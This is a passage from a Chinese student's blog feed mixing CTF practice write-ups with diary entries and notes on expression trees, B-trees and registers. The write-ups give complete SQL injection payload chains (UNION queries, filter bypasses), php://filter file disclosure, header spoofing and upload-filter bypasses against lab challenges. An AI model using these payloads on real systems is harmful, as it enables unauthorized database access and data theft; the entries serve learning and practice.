class="hljs-number">0</span>;$i&lt;strlen($dir);++$i)&#123;        $nkey=$key.$dir[$i];        $ans=<span class="hljs-string">''</span>;        <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;strlen($tmp);++$j)&#123;            $ans.=$tmp[$j]^$nkey[$j];        &#125;        echo base64_encode($rnd.$ans).<span class="hljs-string">'&lt;/br&gt;'</span>;    &#125;&#125;getAns(<span class="hljs-string">'guest'</span>,<span class="hljs-string">'YnV6RhQdCx4a'</span>)?&gt;</code></pre><br>再到config.php爆破cookie就好了<br>注：每次下发得cookie不一样，cookie—key-cookie,但是按照key在encrypt和dectypt函数中的使用，应该是加了$rnd$再md5加密后才使用，并且并未用到key的第一位，不知道为什么可以互用，留个坑。</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku20.09.05</title>
    <link href="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/"/>
    <url>/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<p>又是一脸懵逼的一天。。</p><hr><p>成绩单<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20134633.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>进去啥也没发现，查看源码没什么收获，看到表单自然就想着SQL注入。<br>正常的输入数字1、2、3都得到结果，尝试1’错误，再试1’—没用，加空格（1’— ）或者1’#正常返回，应该是MYSQL数据库。再尝试数字注入1+1结果返回结果和1一样，应该不是    按数字格式处理。<br>最后尝试注入查询结构。看查询返回的界面应该是有4列（姓名以及三门分数），尝试1’ order by 4#返回正常，再试1’ order by 5#没有返回，应该是四列。<br>最后用UNION联合注入，1’ union select null,null,null,null#依然只返回一行，重置union前面的查询，用’ union select 1,2,3,4#有返回。<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20135806.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>开始注入查询：<br><code>&#39; union select null,null,null,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>得到两个table_name: fl4g,sc<br> <code>&#39; union select null,null,null,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code><br> 得到列名skctf_flag<br> <code>&#39; union select null,null,null,skctf_flag from fl4g#</code><br> 得到flag</p><hr><p>SQL(ichunqiu)<br>题目明确告诉flag在数据库里。<br>id=1’#没有回显，1#可以正常显示，0+1没有回显，用order by查结构显示inj code!,应该是过滤了关键字，用/**/注释依然没有显示，采用&lt;&gt;成功注入，最终在order by 4时没有回显。<br>union联合查询，依然用&lt;&gt;避开select,and等的过滤。发现联合查询的第二个返回结果可以显示<br>注入过程：</p><pre><code>1+union+se&lt;&gt;lect+1,database(),3#</code></pre><p>得到数据库名称sqli</p><pre><code>1+union+se&lt;&gt;lect+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=%27sqli%27#</code></pre><p>   得到数据库表名info,users</p><pre><code>1+union+se&lt;&gt;lect+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=%27info%27#</code></pre><p>得到列名id,title,flAg_T5ZNdrm</p><pre><code>1+union+se&lt;&gt;lect+1,flAg_T5ZNdrm,3+from+sqli.info#</code></pre><p>得到flag(用users得不到flag)</p><hr><p>以为SQL勉强入门了，结果。。</p><hr><p>SQLI<br>(i春秋好难)<br>进去啥也没有，看源代码找到login.php?id=1，进去后显示welcome admin~，似乎非常顺利。开始对id各种注入，发现完全行不通。怕不是假的admin…<br>转到index.php,结果发现出来的网页是b68a89d1c4a097a9d8631b3ac45e8979.php，查看bp的HTTP history，果然发现有个302的响应，进去看到<img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20224204.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>看到l0gin.php?id=1进去。<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20224326.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>奇怪的注入，测试后得到的有用信息是过滤#和’,’以及两列(order by)，#用%23代替即可，’,’在union联合查询中会用，代替方法见<a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/" target="_blank" rel="noopener">链接</a><br>注入过程：</p><p>  <code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+database())b%23</code><br> 得到数据库名sqli</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#39;sqli&#39;)b%23</code></pre><p>得到数据表名users</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#39;users&#39;)b%23</code></pre><p>得到列名id,username,flag_9c861b688330</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+flag_9c861b688330+from+sqli.users)b%23</code></pre><p>  得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku20.09.04</title>
    <link href="/2020/09/04/bugku%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/"/>
    <url>/2020/09/04/bugku%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/</url>
    
    <content type="html"><![CDATA[<p>懒得上图，随便写几个题</p><hr><p>网站被黑<br>进去界面后没有找到提示，尝试burpsuit爬虫结果连续错误太多自动停止，改用爆破，得到shell.php（似乎许多后门都叫这个？），之后正常密码爆破就行。</p><hr><p>管理员系统<br>进去就是登录界面，看源码发现”dGVzdDEyMw== “的字符串，base64解码得到test123，猜测这是密码，账号用admin，结果出现“IP禁止访问，请联系本地管理员登陆，IP已被记录.”。<br>考虑用XFF伪装成本地登录（127.0.0.1）,成功得到flag。</p><hr><p>web4<br>提示看源代码，找到p1,p2两段像url编码的字符串，解码就好。</p><hr><p>flag在index里<br>不会做的一道题。。。<br>根据题目以及在点击”click me?no”后url中的file参数，联想到php://filter(完全没见过，无法联想。。)<br>php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。</p><blockquote><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p></blockquote><p>通过php://filter/read=convert.base64-encode/resource=./index.php得到index.php的base64编码后的显示，再解码即可得到index.php内容</p><hr><p>备份是个好习惯<br>显然，看到题目就知道要找.bak，进题后看到一串奇怪的字符串，md5解密得到空。下载index.php.bak，代码审计。<br>注意parse_str函数把查询字符串解析到变量中，比如?f=flag，则有变量$f=flag。<br>注意会过滤key，双写即可</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>百度杯九月场123-20.09.04</title>
    <link href="/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/"/>
    <url>/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/</url>
    
    <content type="html"><![CDATA[<p><img src="/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/%E6%89%B9%E6%B3%A8%202020-09-04%20134140.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>进入链接，直接是登录界面，查看源码得知用户都在user.php里，密码是用户名+出生日期。<br>直接进user.php发现什么都没有，尝试下载备份文件user.php.bak，果然可以。得到用户名单后用burpsuit爆破。注意爆破技巧，选择多payload,对用户名自然用得到得user.php.bak文件，密码复制payload1加后缀，尝试原来index.php界面源码提示里的1995成功爆破登录。<br>登录后的界面还是什么都没，查看源码去掉form表单的注释显示处文件上传。起初以为是传一句话木马，结果提示只能传后缀.jpg,.png,.gif,.bmp的文件，改成上传jpg图片，结果发现还是不行，改成提示文件名不正确。到这之后一直卡了很久，在网上找wp发现上传.jpg.pht文件可以(pht文件是手机照片常用格式，知识实在匮乏)。<br>       成功上传文件后出现view链接，链接到view.php界面，显示”file?”,在url上加上?file=flag，得到filter”flag”，提示flag被过滤了，用双写避过过滤(flflagag)，得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞查找</title>
    <link href="/2020/09/02/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE/"/>
    <url>/2020/09/02/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>This typically involves:</p><ul><li>Submitting the single quote character  <code>&#39;</code>  and looking for errors or other anomalies.</li><li>Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.</li><li>Submitting Boolean conditions such as  <code>OR 1=1</code>  and  <code>OR 1=2, and</code>  looking for differences in the application’s responses.</li><li>Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.</li><li>Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.</li></ul><hr><p>先试字符注入，再试数字注入，再注入查询结构，再联合查询等<br>对url注入时</p><ul><li>空格用%20或+代替</li><li>+用%2b代替</li><li>注意注释— 要加空格</li><li><h1 id="用-23代替"><a href="#用-23代替" class="headerlink" title="用%23代替"></a>用%23代替</h1>若是表单则可通过拦截查看是否需要如此</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020/9/2</title>
    <link href="/2020/09/02/2020-9-2/"/>
    <url>/2020/09/02/2020-9-2/</url>
    
    <content type="html"><![CDATA[<p>不写标题了<br><a id="more"></a><br>似乎已经很久没有这么失落过了，搬宿舍忙活了一天，脚趾甲已经嵌入肉里，每走一步都觉得疼痛。<br>新宿舍十分的不适应，我自认为已经有过多年的住宿经验了，从小学时15个人的拥挤宿舍，到初高中12人或是6人宿舍，到沙河时的上床下桌，我都经历了过来。但是如今的住宿环境总让我心生怯意。最近返校时对大城市的抵触感、对家乡小镇的亲近感，降转的陌生以及对未来道路的忐忑，初到学院路的孤独无助，众多情绪似乎都积压在心里。<br>套间制的宿舍，舍友脾气并不好。在宿舍为换空调不断被踢皮球，却始终没有换成。一个人去校内吃饭，在庞大的校区里紧紧盯着高德地图，生怕自己走错。在食堂浑浑噩噩的点了份极贵的饭菜，不好吃，但是又不愿意浪费。拿着购置的许多生活用品在夜晚的校园里寻找回大运村的路。在各处保安点手忙脚乱掏出校园卡机器却反复提示禁止通行。一个人在浴室捣鼓怎么让水从花洒里流出。明天需要一个人去中关村参加比赛。终于在洗完澡后绝望感不可抑制的包围了我：我居然要在这个宿舍呆上3年。已经可以遇见两年后原来的同学穿着毕业服，而我却只能默默送上祝福…<br>越来越希望能在研究生时离家近点，我似乎并不适合大城市的生活。。</p>]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搬校区前的一些琐碎</title>
    <link href="/2020/08/31/%E6%90%AC%E6%A0%A1%E5%8C%BA%E5%89%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%90%E7%A2%8E/"/>
    <url>/2020/08/31/%E6%90%AC%E6%A0%A1%E5%8C%BA%E5%89%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%90%E7%A2%8E/</url>
    
    <content type="html"><![CDATA[<p>我向来是不愿意与太多人打交道的。<br><a id="more"></a><br>之前在17系时和导师做的项目，我自认为只有我一人时可以完成，但是在项目人多了之后，反而最后只是不了了之。因为需要做工作分配，在大二上结束的时候把结构设计方面交给了其他成员，结果他们似乎对工作进度完全没有什么了解，再加上我转专业后不愿过多的干涉（毕竟涉及到作者排名等）结果只能让项目不了了之。<br>如今分配宿舍后，需要重新认识舍友，并且在大运村的套间设计下似乎要和更多人打交道，这难免让我感到有些不适。与人打交道总会让我没有安全感，容易疲倦，而机器则不然。虽然机器由人设计，但是我认为在设计结束的时候，它就与人并不相关了，它会永远保持规则，不需要小心应对突如其来的改变，不用在意它会对你升起人类纯粹而无故的恶意。</p>]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于网络环境的一点感慨</title>
    <link href="/2020/07/14/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E7%9A%84%E4%B8%80%E7%82%B9%E6%84%9F%E6%85%A8/"/>
    <url>/2020/07/14/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E7%9A%84%E4%B8%80%E7%82%B9%E6%84%9F%E6%85%A8/</url>
    
    <content type="html"><![CDATA[<p>这次疫情在家已经半年多了，自己本来就不喜欢找朋友出去玩（也没啥朋友），在家大多数时候无聊就靠上网打发时间，因此这段时间的上网时长十分的高。但是或许就是因为上网太久了，越来越感觉网络，尤其是有社交功能的网站对自己的情绪有着很大的负面影响。</p><a id="more"></a><hr><p>无论是逛贴吧、bilibili、知乎、微博，经常可以看到很多感觉不可思议的言论，或是赤裸裸的暴力言语，或是阴阳怪气冷嘲热讽，都让人浑身难受，许多在现实生活中可以好好讨论的分歧、误解，在网络上却往往只是靠观点的喷射来分胜负。双方都更喜欢“讲道理”（如果纯粹的观点打架属于讲道理的话），而不是“有理有据”。即使起初双方能保留理智依据而论，但是往往会因为言语反驳中使用的不友好的网络用语而逐渐演变成骂街，又或者是先因为某一方言辞中的问题（或是因为第三方的介入）逐渐转移争吵的焦点，最终依然逃不过沦为情绪发泄的后果。</p><p>互联网上的争吵大多数是没有结果的。在贴吧这种各用户发言的权重相等的平台上，你永远不知道你看到的言论来自怎样的发言者。或许双方只是有一项共同的兴趣而已，与之争吵往往会因为彼此价值观的不同互相认为对方不可理喻，甚至进行人身攻击。而bilibili，知乎这种区分内容创作者与内容阅读者的平台（虽然二者身份有交集，但是转变具有门槛，存在大咖的身份），由于粉丝群体存在的边界模糊，往往会出现不同明星的粉丝们在对方的评论区等地出现摩擦，此时的争论往往成为针对群体的攻击，因此往往会越聚越多，场面混乱不堪。这种环境下，自然不可能进行正常争论。</p>]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>表达式计算</title>
    <link href="/2020/06/18/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    <url>/2020/06/18/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%A1%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<p>关于中缀表达式，后缀表达式以及表达式树。<br><a id="more"></a></p><hr><p>中缀表达式计算：<br>step:</p><ul><li>建立两个栈分别存储运算符与数字</li><li>入栈，运算符入栈时若需出栈直接与数字进行计算，结果入数字栈</li><li>清空运算符栈得结果</li></ul><hr><p>后缀表达式计算：<br>step:</p><ul><li>建数字栈</li><li>遇到运算符出栈计算，结果入栈</li></ul><hr><p>中缀表达式转表达式树：<br>step:</p><ul><li>建立两个栈存储运算符与树结点</li><li>遇到数字建立结点入树结点栈</li><li>遇到运算符入运算符栈，若需出栈则出栈运算符建立结点并与结点栈两结点连接，连接得到结点入结点栈</li><li>清空运算符栈</li></ul><hr><p>后缀表达式转表达式树：<br>step:</p><ul><li>建立树节点栈</li><li>遇到数字建立结点入栈</li><li>遇到运算符建立结点并与栈顶两结点连接，连接结果入栈</li></ul><hr><p>表达式树转后缀表达式：<br>step:</p><ul><li>后序编历</li></ul><hr><p>表达式树转中缀表达式：<br>step:</p><ul><li>中序遍历，注意添加括号<ul><li>如果根节点是+号，那么无论左子树以及右子树是什么操作符，它们都是不需要加括号的，因为根节点+号是最小优先级的</li><li>如果根节点是-号，那么只有右子树是+号或者-号时，右子树才需要加括号</li><li>如果根节点是*号，那么只有左子树或右子树是+号或者-号时，它们才需要加括号</li><li>如果根节点是/号，那么如果左子树或右子树是+号或者-号时，它们需要加括号，其次，如果右子树是*号或者/号时，右子树也需要加括号<pre><code class="hljs xl">void dfs(bt* q)&#123;<span class="hljs-keyword">if</span>(q == NULL)return;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span>op == <span class="hljs-string">'+'</span>)&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op == <span class="hljs-string">'-'</span>)&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op == <span class="hljs-string">'*'</span>)&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);&#125;<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op==<span class="hljs-string">'/'</span>)&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);&#125;<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span> == '+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='-'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='*'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op == <span class="hljs-string">'/'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%d",q-&gt;</span>num);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;&#125;</code></pre></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>caller saved registers and callee saved registers</title>
    <link href="/2020/05/16/caller-save-registers-and-callee-save-registers/"/>
    <url>/2020/05/16/caller-save-registers-and-callee-save-registers/</url>
    
    <content type="html"><![CDATA[<p>看的书里“被调用者保存寄存器”黑体部分没有带上“被”，云里雾里，不知道是印刷的问题还是翻译的问题。还是用英文概念区分安全。<br><a id="more"></a></p><p><img src="/2020/05/16/caller-save-registers-and-callee-save-registers/WgcQv.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><p>根据stack overflow看到的回答：</p><blockquote><p><strong>Caller-saved registers</strong>  (AKA  <strong>volatile</strong>  registers, or  <strong>call-clobbered</strong>) are used to hold temporary quantities that need not be preserved across calls.</p></blockquote><p>For that reason, it is the caller’s responsibility to push these registers onto the stack or copy them somewhere else  _if_  it wants to restore this value after a procedure call.</p><p>It’s normal to let a  <code>call</code>  destroy temporary values in these registers, though.</p><blockquote><p><strong>Callee-saved registers</strong>  (AKA  <strong>non-volatile</strong>  registers, or  <strong>call-preserved</strong>) are used to hold long-lived values that should be preserved across calls.</p></blockquote><p>When the caller makes a procedure call, it can expect that those registers will hold the same value after the callee returns, making it the responsibility of the callee to save them and restore them before returning to the caller. Or to not touch them.</p><hr><p>所谓的caller saved register，其实就是寄存器保存的值函数调用时不保留，所以如果需要要通过入栈或保留到其他地方来保存这个值。</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>B-树及其相关操作</title>
    <link href="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/"/>
    <url>/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>B-树（B树）属于自平衡树，多路查找树。<br><a id="more"></a></p><hr><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p>一个m阶的B-树为满足下列性质的m叉树：</p><ol><li>每一个分支节点最多有m棵子树。</li><li>除根节点外，每个分支节点至少有$\lceil m/2 \rceil$棵子树。</li><li>根节点至少包含两棵子树（除非根节点即叶节点）</li><li>所有叶节点都在同一层，叶节点不包含任何关键字信息</li><li>所有分支结点包含以下信息<br>$n，p_{0}，key_{1}，p_{1}，key_{2}，p_{2}，\ldots，key_{n}，p_{n}$</li></ol><ul><li>n为节点中关键字的个数，满足$n \leq m-1$</li><li>$key_{i}$为关键字，满足$key_{i} &lt; key_{i+1}$</li><li>$p_{i}$为指向该节点第$i+1$棵子树的指针， 且该子树中关键字的值整体满足$key_{i} &lt; nextfloor-key_{i} &lt; key_{i+1}$</li></ul><p>图例：<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024101S02K.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><hr><h3 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h3><hr><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>查找过程与二叉查找树相似。<br><pre><code class="hljs crmsh"><span class="hljs-comment">#define M 1000</span>struct <span class="hljs-keyword">Node</span><span class="hljs-title">&#123;</span><span class="hljs-title">int</span> keynum;keytype key[M];struct <span class="hljs-keyword">Node</span> <span class="hljs-title">*ptr</span>[M];&#125;;typedef struct <span class="hljs-keyword">Node</span> <span class="hljs-title">BNode</span>;</code></pre></p><h2 id><a href="#" class="headerlink" title></a><pre><code class="hljs gauss">keytype <span class="hljs-built_in">searchBTree</span>(BNode *t,keytype k)&#123;int i,n;BNode *p = t;<span class="hljs-keyword">while</span>(p!= <span class="hljs-built_in">NULL</span>)&#123;n = p-&gt;keynum;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span>(p-&gt;<span class="hljs-built_in">key</span>[i++] &lt; k);<span class="hljs-keyword">if</span>(p-&gt;<span class="hljs-built_in">key</span>[i] == k)<span class="hljs-keyword">return</span> p-&gt;<span class="hljs-built_in">key</span>[i];<span class="hljs-keyword">else</span>p = p-&gt;ptr[i<span class="hljs-number">-1</span>];&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;</code></pre></h2><h4 id="插入节点（建树）"><a href="#插入节点（建树）" class="headerlink" title="插入节点（建树）"></a>插入节点（建树）</h4><p>B-树的生成从空树开始，即逐个在叶节点中插入节点而得到。当m阶树节点中关键字个数大于m-1，则要节点分裂。<br>节点分裂：若将k插入到节点后使该节点的关键字个数超过m-1，则要以该节点位置居中的那个关键字值为界将该节点一分为二，产生一个新节点（q:[1,$\ldots$,$\lceil$m/2$\rceil$-1],q’:[$\lceil$m/2$\rceil$+1,$\ldots$,m-1]），并将$key_{\lceil m/2 \rceil}$与指向q和q’的指针插入到双亲节点中。<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024102942E3.png?v=1&amp;type=image" srcset="/img/loading.gif" alt><br>插入26：<br><img src="/2020/05/14/B-%E6%A0%91%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/2-1G024103030D2.png?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"></p><p>代码示例：<br><pre><code class="hljs plain"></code></pre></p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>study tree</title>
    <link href="/2020/05/13/study-tree/"/>
    <url>/2020/05/13/study-tree/</url>
    
    <content type="html"><![CDATA[<p>可参考学习<br><img src="/2020/05/13/study-tree/security_skill_tree_basic.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二十而惑</title>
    <link href="/2020/05/08/%E4%BA%8C%E5%8D%81%E8%80%8C%E6%83%91/"/>
    <url>/2020/05/08/%E4%BA%8C%E5%8D%81%E8%80%8C%E6%83%91/</url>
    
